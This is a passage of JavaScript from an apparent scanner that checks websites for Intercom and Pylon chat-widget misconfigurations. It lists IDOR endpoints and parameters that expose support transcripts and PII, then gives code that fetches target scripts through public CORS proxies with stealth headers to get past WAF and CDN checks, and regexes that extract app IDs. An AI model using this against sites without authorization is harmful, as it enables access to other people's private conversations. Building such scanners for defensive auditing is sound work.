      rec: 'Implement Intercom Identity Verification: require server-side HMAC-SHA256 (user_hash) on every request. Reject requests where user_id does not match the session-derived signature.'
    },
    a02: {
      id: 'A02', title: 'Intercom Misconfig — email IDOR',
      cvss: '7.5', severity: 'HIGH',
      vuln: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
      endpoint: 'POST /messenger/web/conversations',
      api: 'api-iam.intercom.io',
      param: 'user_data → email',
      exposed: 'Conversation history, support rep names, timestamps, read receipts, PII',
      rec: 'Enable & enforce Intercom Identity Verification. Backend must generate user_hash = HMAC-SHA256(secret, email). Intercom dashboard must be set to reject any request without a valid matching user_hash.'
    },
    a03: {
      id: 'A03', title: 'Pylon Chat Widget — Unauthorized Lookup',
      cvss: '8.1', severity: 'HIGH',
      vuln: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
      endpoint: 'GET /chatwidget/unreads + GET /chatwidget/issue',
      api: 'apichatwidget.usepylon.com',
      param: 'email (Step 1) → issue_id (Step 2)',
      exposed: 'Full support transcripts, user names, PII, credentials shared in chat',
      rec: 'Implement strict server-side authorization: verify the authenticated session/signed token matches the issue_id owner. The /chatwidget/unreads endpoint must NOT return sensitive identifiers to unauthenticated requesters.'
    }
  };

  return { templates, responses, summaries, responseData, PYLON_APP_ID };
})();

// ──────────────────────────────────────────────────
// scanner.js
// ──────────────────────────────────────────────────
// ══════════════════════════════════════════════════
// ScannerEngine.js — Detection logic
// ══════════════════════════════════════════════════
const ScannerEngine = (() => {
  let currentScan = null;
  let logCount = 0;

  function log(msg, type = 'info') {
    const la = document.getElementById('logArea');
    if (!la) return;
    // Smart autoscroll: measure BEFORE appending whether the viewer is already
    // pinned to the bottom (within a 24px slack). Each line slides in via the
    // pure CSS .log-line animation (no JS timers → never lags or races the
    // scanner). The slide uses transform only, so scrollHeight is already
    // correct here and the scroll stays in lockstep with the streaming text.
    const pinned = (la.scrollHeight - la.scrollTop - la.clientHeight) < 24;
    const ts = new Date().toLocaleTimeString('en-US', { hour12: false });
    const div = document.createElement('div');
    div.className = 'log-line';
    div.innerHTML = `<span class="log-ts">[${safeText(ts)}]</span><span class="log-${type}">${escapeHtml(String(msg))}</span>`;
    la.appendChild(div);
    if (pinned) la.scrollTop = la.scrollHeight;
    logCount++;
  }

  // Single source of truth for the live-scan visual state. Toggles body.scanning
  // (drives the progress shimmer + pulsing badge) AND swaps the badge text so it
  // reads a muted "IDLE" at rest and "ACTIVE SCAN" only while a crawl/proof is live.
  function setScanningState(on) {
    document.body.classList.toggle('scanning', !!on);
    const tag = document.getElementById('scanStateTag');
    if (tag) tag.textContent = on ? 'ACTIVE SCAN' : 'IDLE';
  }

  function setProgress(pct) {
    const el = document.getElementById('progressFill');
    if (el) el.style.width = pct + '%';
    // Drive the live "scanning" visual state (progress shimmer + pulsing
    // ACTIVE-SCAN indicator). Cleared automatically once the bar completes.
    if (pct >= 100) setScanningState(false);
  }

  function clearScan() {
    currentScan = null;
    resetCircuitBreakers();
    // Safety net: ensure the live "scanning" visual state can never get stuck
    // (e.g. demo fetch fails before setProgress(100), or deepScan throws).
    // clearScan runs at the start of every scan, before 'scanning' is re-added.
    setScanningState(false);
    document.getElementById('findingsContainer').innerHTML = `<div class="scan-empty">
        <svg class="scan-empty-icon" viewBox="0 0 64 64" width="52" height="52" fill="none" aria-hidden="true">
          <circle class="scan-empty-ring scan-empty-ring--1" cx="27" cy="27" r="22" stroke="currentColor" stroke-width="1.25"/>
          <circle class="scan-empty-ring scan-empty-ring--2" cx="27" cy="27" r="15" stroke="currentColor" stroke-width="1.5"/>
          <circle cx="27" cy="27" r="8" stroke="currentColor" stroke-width="2"/>
          <circle cx="27" cy="27" r="2.5" fill="currentColor"/>
          <line x1="42" y1="42" x2="55" y2="55" stroke="currentColor" stroke-width="3.5" stroke-linecap="round"/>
        </svg>
        <div class="scan-empty-title">Ready to scan</div>
        <div class="scan-empty-text">Enter a target URL above and hit <span class="kbd">Scan</span> &mdash; or press <span class="kbd">Enter</span>.</div>
      </div>`;
    document.getElementById('logArea').innerHTML = '';
    setProgress(0);
    logCount = 0;
  }

  // ══════════════════════════════════════════════════════
  // FETCH LAYER — rebuilt for CDN stealth + reliability
  // ══════════════════════════════════════════════════════
  //
  // Proxy priority (fastest + most permissive first):
  //   0. Direct fetch (force-cache, omit credentials)
  //   1. codetabs   — raw text, good JS chunk support
  //   2. allorigins — JSON wrapper, reliable HTML fetches
  //   3. corsproxy  — forwards headers to origin CDN
  //
  // Circuit breaker: each proxy tracks consecutive failures.
  // After 2 failures (403 or timeout) it is skipped for the
  // rest of the session — stops wasting time on dead proxies.

  function getOrigin(url) {
    try { return new URL(url).origin; } catch { return ''; }
  }

  // Stealth headers — mimic a browser fetching a script tag
  // Referer = target origin so CDN hotlink checks pass
  function buildHeaders(targetOrigin) {
    return {
      'User-Agent'     : 'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
      'Accept'         : '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Referer'        : targetOrigin ? targetOrigin + '/' : '',
      'Sec-Fetch-Dest' : 'script',
      'Sec-Fetch-Mode' : 'no-cors',
      'Sec-Fetch-Site' : 'same-origin',
      'Cache-Control'  : 'no-cache',
    };
  }

  // Circuit breaker state — reset on each new scan via resetCircuitBreakers()
  const _cb = {};   // { proxyName: { failures: 0, tripped: false } }
  function resetCircuitBreakers() { Object.keys(_cb).forEach(k => { _cb[k] = { failures: 0, tripped: false }; }); }
  function cbFail(name) {
    if (!_cb[name]) _cb[name] = { failures: 0, tripped: false };
    _cb[name].failures++;
    if (_cb[name].failures >= 2) { _cb[name].tripped = true; }
  }
  function cbOk(name)      { if (_cb[name]) _cb[name].failures = Math.max(0, _cb[name].failures - 1); }
  function cbTripped(name) { return _cb[name]?.tripped === true; }

  const PROXY_DEFS = [
    {
      name: 'codetabs',
      fn  : (u) => `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(u)}`,
      json: false, fwdHeaders: false,
    },
    {
      name: 'allorigins',
      fn  : (u) => `https://api.allorigins.win/get?url=${encodeURIComponent(u)}`,
      json: true,  fwdHeaders: false,
    },
    {
      name: 'corsproxy',
      fn  : (u) => `https://corsproxy.io/?url=${encodeURIComponent(u)}`,
      json: false, fwdHeaders: true,
    },
    {
      name: 'crossorigin',
      fn  : (u) => `https://crossorigin.me/${u}`,
      json: false, fwdHeaders: false,
    },
    {
      // 5th fallback — different CDN exit node, different IP range
      name: 'thingproxy',
      fn  : (u) => `https://thingproxy.freeboard.io/fetch/${u}`,
      json: false, fwdHeaders: false,
    },
  ];

  async function proxyFetch(url, timeoutMs = 12000, logFn = () => {}) {
    const origin = getOrigin(url);
    const isJs   = /\.js(\?|$)/.test(url);
    let lastErr  = null;

    // ── Attempt 0a: Real CORS direct fetch ─────────────────────────────
    // Try this FIRST — works when a CORS-Anywhere or CORS-Unblock browser
    // extension is active. The no-cors probe only confirms reachability;
    // this attempt actually reads the body.
    // No custom headers so no preflight OPTIONS is triggered.
    try {
      const res = await fetch(url, {
        method     : 'GET',
        mode       : 'cors',
        credentials: 'omit',
        cache      : 'no-cache',       // bypass cache to get the real file
        signal     : AbortSignal.timeout(Math.min(timeoutMs, 8000)),
      });
      if (res.ok) {
        const text = await res.text();
        const isWaf = isJs && (text.length < 500 || text.trimStart().startsWith('<!'));
        if (!isWaf) {
          logFn(true, `direct (CORS): OK ${(text.length/1024).toFixed(0)}KB`);
          const raw = text;
          let decoded = null;
          if (text.includes('%')) { try { decoded = decodeURIComponent(text); } catch(_) {} }
          return { text, raw, decoded };
        }
        logFn(false, `direct (CORS): ${text.length}B — WAF, trying proxies`);
      } else {
        logFn(false, `direct (CORS): HTTP ${res.status} — trying proxies`);
      }
    } catch (e) {
      // Expected when no CORS extension is active — fall through silently
      logFn(false, `direct (CORS): ${e.name === 'TypeError' ? 'blocked (no CORS ext)' : e.message}`);
    }

    // ── Attempt 0b: no-cors reachability probe ─────────────────────────
    // Confirms the CDN origin is up. Doesn't read the body.
    try {
      await fetch(url, { method: 'GET', mode: 'no-cors', credentials: 'omit',
                         cache: 'force-cache', signal: AbortSignal.timeout(3000) });
      logFn(true, `direct (no-cors): resource reachable`);
    } catch (e) {
      logFn(false, `direct probe: ${e.message}`);
    }

    // ── Attempts 1-N: Proxy chain with circuit breakers ────────────────
    for (const proxy of PROXY_DEFS) {
      if (cbTripped(proxy.name)) {
        logFn(false, `[${proxy.name}] skipped — circuit breaker tripped`);
        continue;
      }
      try {
        const headers = { 'Accept': '*/*' };
        if (proxy.fwdHeaders) Object.assign(headers, buildHeaders(origin));

        const res = await fetch(proxy.fn(url), {
          method : 'GET',
          headers,
          signal : AbortSignal.timeout(timeoutMs),
        });

        if (!res.ok) {
          logFn(false, `[${proxy.name}] HTTP ${res.status} ${res.statusText}`);
          cbFail(proxy.name);
          lastErr = new Error(`${proxy.name}: ${res.status} ${res.statusText}`);
          continue;
        }

        const text = proxy.json
          ? (() => { return res.json().then(j => j.contents || j.body || ''); })()
          : res.text();
        let resolved = await text;
        const rawResolved = resolved;

        let decodedResolved = null;
        if (typeof resolved === 'string' && resolved.includes('%')) {
          try {
            const dec = decodeURIComponent(resolved);
            if (dec.length > 0) decodedResolved = dec;
          } catch (_) {}
        }

        // WAF check — real JS is never under 500B
        if (isJs && resolved.length < 500) {
          logFn(false, `[${proxy.name}] ${resolved.length}B < 500B — WAF → next proxy`);
          lastErr = new Error(`${proxy.name}: WAF`);
          continue;   // no cbFail — proxy is fine, CDN is blocking
        }
        const t2 = resolved.trimStart();
        if (isJs && (t2.startsWith('<!') || t2.startsWith('<html'))) {
          logFn(false, `[${proxy.name}] got HTML not JS — CDN blocked → next proxy`);
          lastErr = new Error(`${proxy.name}: HTML`);
          continue;
        }

        cbOk(proxy.name);
        logFn(true, `[${proxy.name}] OK ${(resolved.length/1024).toFixed(0)}KB`);
        return { text: resolved, raw: rawResolved, decoded: decodedResolved };

      } catch (e) {
        const reason = e.name === 'AbortError' ? 'timeout' : e.message;
        logFn(false, `[${proxy.name}] ${reason}`);
        cbFail(proxy.name);
        lastErr = new Error(`${proxy.name}: ${reason}`);
      }
    }

    throw lastErr || new Error('all proxies exhausted');
  }

  // ── DOM side-load fallback ──────────────────────────
  // When every proxy is blocked, inject a <script src> tag and poll
  // window.intercomSettings / window.Intercom for the app_id.
  // Only works if the target is the same origin OR CORS is unlocked.
  function sideLoadExtract(src, logFn = () => {}, timeoutMs = 4000) {
    return new Promise((resolve) => {
      logFn(true, `side-load: injecting <script src="${src.split('/').pop()}">`);
      const before = Object.keys(window).filter(k => k.toLowerCase().includes('intercom') || k === 'Pylon');
      const tag = document.createElement('script');
      tag.src = src;
      tag.crossOrigin = 'anonymous';

      let settled = false;
      const finish = (result) => {
        if (settled) return;
        settled = true;
        try { document.head.removeChild(tag); } catch {}
        resolve(result);
      };

      // Poll window after load for any new Intercom keys
      tag.onload = () => {
        // Give inline scripts ~300ms to run
        setTimeout(() => {
          // Check window.intercomSettings
          const settings = window.intercomSettings || window.IntercomSettings;
          if (settings?.app_id) {
            logFn(true, `side-load: found app_id="${settings.app_id}" via window.intercomSettings`);
            return finish({ appId: settings.app_id, source: 'side-load-window' });
          }
          // Check for new window keys added by the script
          const after = Object.keys(window).filter(k => k.toLowerCase().includes('intercom'));
          const newKeys = after.filter(k => !before.includes(k));
          if (newKeys.length) {
            logFn(true, `side-load: new window keys: ${newKeys.join(', ')}`);
            for (const k of newKeys) {
              const val = window[k];
              if (val?.appId || val?.app_id) {
                const id = val.appId || val.app_id;
                logFn(true, `side-load: found app_id="${id}" via window.${k}`);
                return finish({ appId: id, source: `side-load-${k}` });
              }
            }
          }
          logFn(false, `side-load: script ran but no Intercom keys found`);
          finish(null);
        }, 300);
      };

      tag.onerror = () => {
        logFn(false, `side-load: script blocked (CSP or CORS)`);
        finish(null);
      };

      setTimeout(() => {
        logFn(false, `side-load: timeout after ${timeoutMs}ms`);
        finish(null);
      }, timeoutMs);

      document.head.appendChild(tag);
    });
  }

  // ══════════════════════════════════════════════════════
  // CONSTANTS — safe to reference anywhere in the engine.
  // INTERCOM_WIDGET_URL is kept as a named const so any
  // remaining reference in older code won't crash.
  // ══════════════════════════════════════════════════════

  // Safety shim — prevents ReferenceError if any stale code
  // still uses INTERCOM_WIDGET_URL as a standalone variable.
  const INTERCOM_WIDGET_URL = /widget\.intercom\.io\/widget\/([a-zA-Z0-9]{6,12})/i;

  // ── Blacklist ──────────────────────────────────────────
  // Known generic/internal Intercom workspace IDs that appear
  // in Intercom's own CSS or SDK — NOT customer app_ids.
  // z70al9 / 1b99hb9 are Intercom's internal messenger namespaces.
  const BLACKLISTED_IDS = ['z70al9', '1b99hb9', 'with', 'namespace', 'intercom', 'container'];
  const GENERIC_ID_BLACKLIST = new Set(BLACKLISTED_IDS.map(s => s.toLowerCase()));

  // ── ID Validator ──────────────────────────────────────
  //
  // Two valid shapes — anything else is rejected:
  //
  //   INTERCOM  — 6-10 chars, strictly alphanumeric (no hyphens).
  //               Length cap rejects all hashes, MongoDB ObjectIds, and
  //               analytics tokens that are typically 16-32+ chars.
  //               e.g. "mi5ahsss" ✓  "ab12cd34" ✓
  //               e.g. "601c400ebbb357463aad3f70" ✗ (24 chars > 10 limit)
  //
  //   PYLON     — strict UUID: 8-4-4-4-12 hex groups separated by hyphens.
  //               e.g. "99eb6b49-90f0-42c5-99f5-6f509ecc0e88" ✓
  //
  //   REJECTED  — everything else: wrong length, wrong format, blacklisted,
  //               or contains non-alphanum chars (%, ., /, etc.)

  const INTERCOM_ID_RE = /^[a-zA-Z0-9]{6,10}$/;
  const PYLON_UUID_RE  = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

  function isValidAppId(id) {
    if (!id || typeof id !== 'string') return false;
    if (GENERIC_ID_BLACKLIST.has(id.toLowerCase())) return false;
    // Path 1: strict Pylon UUID (36 chars with hyphens in exact positions)
    if (PYLON_UUID_RE.test(id)) return true;
    // Path 2: Intercom customer app_id (6-10 alphanumeric chars, no hyphens)
    // Length cap of 10 is the only filter needed — 24-char hex IDs fail here.
    if (INTERCOM_ID_RE.test(id)) return true;
    return false;
  }

  // Detect vendor from extracted ID format
  function vendorFromId(id) {
    if (!id) return null;
    if (PYLON_UUID_RE.test(id)) return 'UsePylon';
    if (INTERCOM_ID_RE.test(id)) return 'Intercom';
    return null;
  }

  // Legacy alias
  function isBlacklisted(id) { return !isValidAppId(id); }

  // ── Confidence tiers ──────────────────────────────────
  // TIER 1 — HIGH:   ID found inside Intercom("boot") call, intercomSettings
  //                  object, providerKey assignment, or widget CDN URL.
  //                  These are boot arguments — definitively the customer ID.
  // TIER 2 — MEDIUM: ID found in generic key:value pattern anywhere in source.
  // TIER 3 — LOW:    CSS namespace (last resort, may be wrong workspace).
  //
  // KEY DESIGN: providerKey and vendorKey are SYNONYMS for app_id.
  // Many wrapper libraries (Chameleon, CustomerIO, Segment) use providerKey
  // instead of app_id to initialize Intercom. Both are TIER 1 — equally
  // authoritative. Patterns are case-insensitive where the value matters.

  // TIER 1 — boot() / intercomSettings / providerKey / vendorKey / widget URL
  // All patterns are case-insensitive (/i flag).
  // providerKey and vendorKey are FIRST-CLASS synonyms for app_id —
  // they are TIER 1 because they are Intercom-specific keys, never CSS noise.
  // Handles all assignment styles: key:"val", key:'val', key=`val`, key='val', key="val"
  const INTERCOM_BOOT_PATTERNS = [
    // Intercom("boot", { app_id: "mi5ahsss", ... })
    /Intercom\s*\(\s*["']boot["']\s*,[^)]{0,800}app_id\s*:\s*["']([a-zA-Z0-9]{6,12})["']/i,
    // window.intercomSettings = { app_id: "mi5ahsss" }
    /(?:window\.)?intercomSettings\s*=\s*\{[^}]{0,800}app_id\s*:\s*["']([a-zA-Z0-9]{6,12})["']/i,
    // intercomSettings ... app_id within 200 chars (minified)
    /intercomSettings[^;]{0,200}app_id\s*:\s*["']([a-zA-Z0-9]{6,12})["']/i,
    // { provider: 'intercom', providerKey: 'mi5ahsss' } — EXACT real-world form
    /provider\s*[=:]\s*["']intercom["'][^}]{0,200}providerKey\s*[=:]\s*["'`]([a-zA-Z0-9]{6,12})["'`]/i,
    // providerKey: "mi5ahsss" | providerKey: 'mi5ahsss' | providerKey: `mi5ahsss`
    // providerKey = "mi5ahsss" | providerKey = 'mi5ahsss' | providerKey:"mi5ahsss"
    /providerKey\s*[=:]\s*["'`]([a-zA-Z0-9]{6,12})["'`]/i,
    // vendorKey synonym — same assignment styles
    /vendorKey\s*[=:]\s*["'`]([a-zA-Z0-9]{6,12})["'`]/i,
    // vendorkey (lowercase variant — some minifiers lowercase keys)
    /vendorkey\s*[=:]\s*["'`]([a-zA-Z0-9]{6,12})["'`]/i,
    // widget.intercom.io/widget/mi5ahsss — CDN src URL
    /widget\.intercom\.io\/widget\/([a-zA-Z0-9]{6,12})/i,
  ];

  // TIER 2 — generic key:value anywhere (medium confidence)
  const INTERCOM_INLINE = [
    /app_id\s*:\s*["']([a-zA-Z0-9]{6,12})["']/i,
    /"app_id"\s*:\s*"([a-zA-Z0-9]{6,12})"/i,
    /app_id:["']([a-zA-Z0-9]{6,12})["']/i,
    /\.app_id\s*=\s*["']([a-zA-Z0-9]{6,12})["']/i,
    /\\"app_id\\":\\"([a-zA-Z0-9]{6,12})\\"/i,
    /\\"providerKey\\":\\"([a-zA-Z0-9]{6,12})\\"/i,
    /\\"vendorKey\\":\\"([a-zA-Z0-9]{6,12})\\"/i,
  ];

  const PYLON_INLINE = [
    /appId\s*:\s*["']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["']/i,
    /"appId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"/i,
    /appId:["']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["']/i,
    /app_id=([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})/i,
  ];

  // ── Security Status Detection ─────────────────────────────────────────
  // Split into vendor-specific pattern sets so evidence log names the right vendor.
  //
  // INTERCOM — user_hash, identity_verification, X-Hmac-Verification,
  //            and server-side HMAC generation calls.
  // PYLON    — email_hash (Pylon's equivalent of user_hash),
  //            X-Pylon-Hmac/Signature headers, JWT session tokens,
  //            and Pylon widget-internal HMAC references.
  const HMAC_PATTERNS_INTERCOM = [
    /user_hash\s*:\s*["''][a-f0-9]{60,}["']/,
    /userHash\s*:\s*["''][a-f0-9]{60,}["']/,
    /"user_hash"\s*:\s*"[a-f0-9]{60,}"/,
    /user_hash:["''][a-f0-9]{60,}["']/,
    /identity_verification\s*[:=]\s*true/i,
    /identityVerification\s*[:=]\s*true/i,
    /["'']identity_verification["'']\s*:\s*true/i,
    /X-Hmac-Verification/i,
    /createHmac\s*\(\s*["'']sha256["']/i,
    /hash_hmac\s*\(\s*["'']sha256["']/i,
    /OpenSSL::HMAC\s*\.hexdigest/i,
    /hmac\.new\s*\(/i,
  ];

  // Pylon uses email_hash (HMAC-SHA256 of email with webhook secret), not user_hash.
  const HMAC_PATTERNS_PYLON = [
    /email_hash\s*:\s*["''][a-f0-9]{40,}["']/i,
    /emailHash\s*:\s*["''][a-f0-9]{40,}["']/i,
    /"email_hash"\s*:\s*"[a-f0-9]{40,}"/i,
    // email_hash as a config key — shows IV is wired even if value is server-generated
    /[,{]\s*["'']?email_hash["'']?\s*:/i,
    /[,{]\s*["'']?emailHash["'']?\s*:/i,
    /\.email_hash\s*=/i,
    /\.emailHash\s*=/i,
    // Pylon-specific security headers
    /X-Pylon-Hmac/i,
    /X-Pylon-Signature/i,
    // JWT-based signed sessions (Pylon supports JWT as IV alternative)
    /\bjwtToken\s*[:=]/i,
    /\buser_jwt\s*[:=]/i,
    /\bjwt_token\s*[:=]/i,
    // Pylon signed_user_data
    /signed_user_data\s*[:=]/i,
    /signedUserData\s*[:=]/i,
    // Pylon widget-internal HMAC reference (visible in minified bundle)
    /hmacSignature/i,
    /hmac_digest\s*[:=]/i,
  ];

  // Flat array for legacy callers (old hasHmac checks in scan loop)
  const HMAC_PATTERNS = [...HMAC_PATTERNS_INTERCOM, ...HMAC_PATTERNS_PYLON];

  // NOTE: detectSecurity() and securityLabel() are defined once, in the
  // "Security Status" section below (search for "── Security Status ──").
  // An earlier duplicate pair lived here and was removed — JS function
  // hoisting meant the later definition always won, so this copy was dead.

  // ── fuzzyExtract ──────────────────────────────────────────────────────
  // Three-layer extraction with two-shape length-aware classification:
  //
  //   Shape A (Intercom)  — [a-z0-9]{6,10}  NOT followed by more alnum
  //   Shape B (UsePylon)  — strict UUID [0-9a-f]{8}-[0-9a-f]{4}-... (36 chars)
  //   Everything else     — rejected (24-char hex, encoded junk, etc.)
  //
  // Fix 3 — Minification splitting:
  //   Files > 50KB are split on [,;{}] before regex runs.
  //   Each token is pre-filtered by keyword presence — skips millions of
  //   irrelevant tokens instantly. Falls back to full-text if no hit.
  function fuzzyExtract(text) {
    if (!text || typeof text !== 'string') return null;
    console.log('chatguard.fuzzyExtract — scanning', text.length, 'chars');

    const UUID_PAT  = '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}';
    const SHORT_PAT = '[a-z0-9]{6,10}';

    // Build ANCHOR once — reused in both searchDirect and ANCHOR2
    const ANCHOR = new RegExp(
      `(?:providerKey|vendorKey|appId|app_id)\\s*[:=]\\s*(?:\\\\u[0-9a-f]{4}|['"])?` +
      `(${UUID_PAT}|${SHORT_PAT}(?![a-z0-9]))` +
      `(?:\\\\u[0-9a-f]{4}|['"])?`,
      'gi'
    );

    // Scan a single text block with ANCHOR
    function searchDirect(t) {
      ANCHOR.lastIndex = 0;
      let m;
      while ((m = ANCHOR.exec(t)) !== null) {
        const c = m[1];
        if (GENERIC_ID_BLACKLIST.has(c.toLowerCase())) continue;
        if (isValidAppId(c)) {
          console.log('chatguard — ANCHOR match:', c, '←', JSON.stringify(m[0]));
          return { appId: c, confidence: 'high', patternName: 'anchor-spec' };
        }
      }
      return null;
    }

    // Fix 3: for large minified files, split on structural delimiters first.
    // A keyword pre-check on each token keeps this fast even for 500KB bundles.
    const KW_RE = /(?:providerKey|vendorKey|appId|app_id)/i;
    function searchWithSplit(fullText) {
      if (fullText.length < 50000) return searchDirect(fullText);
      const tokens = fullText.split(/[,;{}]/);
      for (const tok of tokens) {
        if (!KW_RE.test(tok)) continue;   // fast skip — no keyword in this token
        const hit = searchDirect(tok.trim());
        if (hit) return hit;
      }
      // Fallback: whole-text in case an ID straddled a split boundary
      return searchDirect(fullText);
    }

    const anchorHit = searchWithSplit(text);
    if (anchorHit) return anchorHit;

    // ── Debug: keyword present but ANCHOR missed ──────────────────────────
    let m;
    const KW_PROBE = /(?:providerKey|vendorKey|appId|app_id)/gi;
    while ((m = KW_PROBE.exec(text)) !== null) {
      const ctx = text.slice(m.index, m.index + 60);
      console.log(`[Debug] Keyword '${m[0]}' found but ANCHOR failed. Context: "${ctx.slice(0, 50)}"`);
      console.log(`[Debug] Char codes: ${ctx.slice(m[0].length, m[0].length + 15).split('').map(c => `${c}[${c.charCodeAt(0)}]`).join(' ')}`);
    }

    // ── ANCHOR2 — skips 1-8 non-letter chars (catches \"-escaped quotes) ──
    const ANCHOR2 = new RegExp(
      `(?:providerKey|vendorKey|appId|app_id)[^a-zA-Z]{1,8}` +
      `(${UUID_PAT}|${SHORT_PAT}(?![a-z0-9]))(?=[^a-z0-9-]|$)`,
      'gi'
    );
    while ((m = ANCHOR2.exec(text)) !== null) {
      const c = m[1];
      if (GENERIC_ID_BLACKLIST.has(c.toLowerCase())) continue;
      if (isValidAppId(c)) {
        console.log('chatguard — ANCHOR2 match:', c, '←', JSON.stringify(m[0].slice(0, 40)));
        return { appId: c, confidence: 'high', patternName: 'anchor2-broader' };
      }
    }

    // ── EMERGENCY proximity ────────────────────────────────────────────────
    // Scan all valid-shape runs within 20 chars of a keyword end position.
    const kwMatches = [...text.matchAll(/(?:providerKey|vendorKey|appId|app_id)/gi)];
    if (kwMatches.length > 0) {
      console.log(`[Debug] EMERGENCY: ${kwMatches.length} keyword(s), proximity scan`);
      const kwRanges = kwMatches.map(k => ({ s: k.index, e: k.index + k[0].length }));
      const allRuns  = [...text.matchAll(new RegExp(`${UUID_PAT}|${SHORT_PAT}`, 'gi'))];
      for (const run of allRuns) {
        const ri = run.index, re2 = ri + run[0].length;
        if (kwRanges.some(k => ri < k.e && re2 > k.s)) continue; // overlaps keyword itself
        if (!kwRanges.some(k => Math.abs(ri - k.e) <= 20))  continue; // too far
        const c = run[0].toLowerCase();
        if (GENERIC_ID_BLACKLIST.has(c)) continue;
        if (isValidAppId(run[0])) {
          console.log('chatguard — EMERGENCY match:', run[0]);
          return { appId: run[0], confidence: 'medium', patternName: 'emergency-proximity' };
        }
      }
    }

    console.log('chatguard.fuzzyExtract — no match in', text.length, 'chars');
    return null;
  }


  // ── extractAppId ──────────────────────────────────────
  // Layered extraction — each layer is a fallback for the previous.
  // Existing passes that already work are UNCHANGED (Fix 5).
  // New passes (Fix 1, 2, 4) are additive fallbacks only.
  //
  // LAYER 0: PRIMARY — quoted values, /gi global sweep
  // LAYER 1: UNICODE — unicode/html-encoded quotes (\u0022, &quot;)
  // LAYER 2: SECONDARY — minified, no quotes
  // LAYER 3: DIRTY — proximity search within 20 chars of keyword
  // LAYER 4: TIER 1 boot/intercomSettings patterns (belt-and-suspenders)
  // LAYER 5: TIER 2 generic key:value
  // LAYER 6: Pylon UUID
  function extractAppId(text) {
    if (!text || typeof text !== 'string') return null;

    // Fix 5 diagnostic — confirms full text is being searched
    console.log('extractAppId — searching text length:', text.length, 'chars');

    // ── LAYER 0: PRIMARY — quoted values, global /gi sweep ────────────
    // Exact regex from task spec + extended quote char class.
    // Handles: key:"val" key:'val' key = "val" key = 'val'
    const PRIMARY_RE = /(?:providerKey|vendorKey|appId|app_id)\s*[:=]\s*['"]([a-z0-9]{8,12})['"]/gi;
    let m;
    while ((m = PRIMARY_RE.exec(text)) !== null) {
      const c = m[1];
      if (GENERIC_ID_BLACKLIST.has(c)) { console.log('extractAppId — blacklisted (Generic Asset):', c); continue; }
      if (isValidAppId(c)) {
        console.log('extractAppId — PRIMARY match:', c, 'via', m[0].slice(0, 40));
        return { appId: c, confidence: 'high', patternName: 'primary-global-scan' };
      }
    }

    // ── LAYER 1 (Fix 1): UNICODE / HTML-ENCODED QUOTES ────────────────
    // Handles: providerKey:\u0022mi5ahsss\u0022
    //          providerKey:&quot;mi5ahsss&quot;
    //          providerKey:\u0027mi5ahsss\u0027
    //          providerKey:&#34;mi5ahsss&#34;
    // Also handles the JSON-stringified form: \"providerKey\":\"mi5ahsss\"
    const UNICODE_RE = /(?:providerKey|vendorKey|appId|app_id)\s*[:=]\s*(?:\\u0022|\\u0027|&quot;|&#(?:34|39);|\\"|\\')([a-z0-9]{8,12})(?:\\u0022|\\u0027|&quot;|&#(?:34|39);|\\"|\\')/gi;
    while ((m = UNICODE_RE.exec(text)) !== null) {
      const c = m[1];
      if (GENERIC_ID_BLACKLIST.has(c)) { console.log('extractAppId — unicode blacklisted:', c); continue; }
      if (isValidAppId(c)) {
        console.log('extractAppId — UNICODE match:', c, 'via', m[0].slice(0, 40));
        return { appId: c, confidence: 'high', patternName: 'unicode-encoded-quotes' };
      }
    }

    // ── LAYER 2: SECONDARY — minified, no quotes ──────────────────────
    // e.g. providerKey:mi5ahsss,  appId=mi5ahsss}
    const SECONDARY_RE = /(?:providerKey|vendorKey|appId)\s*[:=]\s*([a-z0-9]{8,12})(?:\s*[,}\];\)]|$)/gi;
    while ((m = SECONDARY_RE.exec(text)) !== null) {
      const c = m[1];
      if (GENERIC_ID_BLACKLIST.has(c)) { console.log('extractAppId — secondary blacklisted:', c); continue; }
      if (isValidAppId(c)) {
        console.log('extractAppId — SECONDARY (minified) match:', c, 'via', m[0].slice(0, 40));
        return { appId: c, confidence: 'medium', patternName: 'secondary-minified-scan' };
      }
    }

    // ── LAYER 3 (Fix 2): DIRTY — proximity search ─────────────────────
    // If structured patterns failed, find the keyword then grab any
    // 8-12 alphanumeric string within the next 20 characters.
    // This catches unusual encodings we haven't anticipated.
    const KEYWORD_RE = /(?:providerKey|vendorKey|appId|app_id)/gi;
    while ((m = KEYWORD_RE.exec(text)) !== null) {
      const keyword = m[0];
      const after = text.slice(m.index + keyword.length, m.index + keyword.length + 60);
      // Fix 4: Near-miss debug — log raw context so we can see exactly what's there
      console.log(`[Debug] Found keyword '${keyword}' at pos ${m.index}. Raw context: "${after.slice(0, 50)}"`);

      // Extract first alphanumeric run of 8-12 chars in the window
      // Bounded by a non-alphanumeric char (or start of window) so we don't
      // grab a 12-char prefix out of a longer string like 'toolongtobevalid'.
      const dirtyMatch = after.match(/(?:^|[^a-z0-9])([a-z0-9]{8,12})(?:[^a-z0-9]|$)/i);
      if (dirtyMatch) {
        const c = dirtyMatch[1].toLowerCase();
        if (GENERIC_ID_BLACKLIST.has(c)) {
          console.log(`[Debug] Dirty candidate '${c}' is blacklisted (Generic Asset), skipping`);
          continue;
        }
        if (isValidAppId(c)) {
          console.log(`extractAppId — DIRTY proximity match: "${c}" near "${keyword}"`);
          return { appId: c, confidence: 'medium', patternName: 'dirty-proximity-search' };
        }
        console.log(`[Debug] Dirty candidate '${c}' failed isValidAppId — not an ID`);
